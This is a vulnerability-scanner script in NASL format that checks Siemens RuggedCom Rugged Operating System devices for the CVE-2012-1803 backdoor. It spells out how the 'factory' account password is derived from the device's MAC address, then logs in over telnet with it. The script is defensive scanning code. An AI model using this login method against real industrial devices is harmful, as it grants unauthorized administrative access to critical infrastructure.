CPE = "cpe:/o:siemens:ruggedcom_rugged_operating_system";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103499" );
	script_version( "2019-10-08T10:38:10+0000" );
	script_bugtraq_id( 53215 );
	script_cve_id( "CVE-2012-1803" );
	script_tag( name: "cvss_base", value: "8.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:S/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2019-10-08 10:38:10 +0000 (Tue, 08 Oct 2019)" );
	script_tag( name: "creation_date", value: "2012-06-21 13:07:51 +0200 (Thu, 21 Jun 2012)" );
	script_name( "Rugged Operating System Backdoor Unauthorized Access Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Default Accounts" );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_siemens_ruggedcom_consolidation.sc", "toolcheck.sc", "gb_default_credentials_options.sc" );
	script_require_ports( "Services/telnet", 23 );
	script_mandatory_keys( "siemens_ruggedcom/telnet/detected", "Tools/Present/perl" );
	script_exclude_keys( "default_credentials/disable_default_account_checks" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53215" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/522467" );
	script_xref( name: "URL", value: "http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-12-116-01.pdf" );
	script_xref( name: "URL", value: "http://www.us-cert.gov/control_systems/pdf/ICSA-12-146-01.pdf" );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/889195" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "summary", value: "Rugged Operating System is prone to an unauthorized-access
  vulnerability due to a backdoor in all versions of the application." );
	script_tag( name: "impact", value: "Attackers can exploit this issue to gain unauthorized access to the
  affected application. This may aid in further attacks." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
if(get_kb_item( "default_credentials/disable_default_account_checks" )){
	exit( 0 );
}
require("telnet_func.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
require("dump.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "telnet" )){
	exit( 0 );
}
if(!get_app_location( port: port, cpe: CPE )){
	exit( 0 );
}
banner = telnet_get_banner( port: port );
if(!banner || ( !ContainsString( banner, "Rugged Operating System" ) || !ContainsString( banner, "MAC Address" ) )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
r = telnet_negotiate( socket: soc );
if(!r || !ContainsString( r, "Rugged Operating System" ) || !ContainsString( r, "MAC Address" )){
	telnet_close_socket( socket: soc, data: r );
	exit( 0 );
}
mac_string = eregmatch( pattern: "MAC Address:[ ]+([0-9A-F-]+)", string: r );
if(!mac_string[1]){
	telnet_close_socket( socket: soc, data: r );
	exit( 0 );
}
mac = mac_string[1];
mac = split( buffer: mac, sep: "-", keep: FALSE );
if(max_index( mac ) != 6){
	telnet_close_socket( socket: soc, data: r );
	exit( 0 );
}
for(x = 5;x >= 0;x--){
	mac_reverse += mac[x];
}
mac_reverse += "0000";
argv[i++] = "perl";
argv[i++] = "-X";
argv[i++] = "-e";
argv[i++] = "print (hex(\"" + mac_reverse + "\") % 999999929);";
argv[i++] = "2>/dev/null";
pass = pread( cmd: "perl", argv: argv, cd: FALSE );
if(!IsMatchRegexp( pass, "[0-9]+" )){
	telnet_close_socket( socket: soc, data: r );
	exit( 0 );
}
user = "factory";
send( socket: soc, data: user + "\n" );
recv = recv( socket: soc, length: 512 );
if(!recv || !ContainsString( recv, "Enter Password" )){
	telnet_close_socket( socket: soc, data: recv );
	exit( 0 );
}
send( socket: soc, data: pass + "\n" );
recv = recv( socket: soc, length: 2048 );
telnet_close_socket( socket: soc, data: recv );
if(ContainsString( recv, "Main Menu" ) && ( ContainsString( recv, "Administration" ) || ContainsString( recv, "Ethernet Ports" ) || ContainsString( recv, "Diagnostics" ) )){
	security_message( port: port, data: "It was possible to login into the Rugged Operating System using username \"factory\" and password \"" + pass + "\"." );
	exit( 0 );
}
exit( 99 );

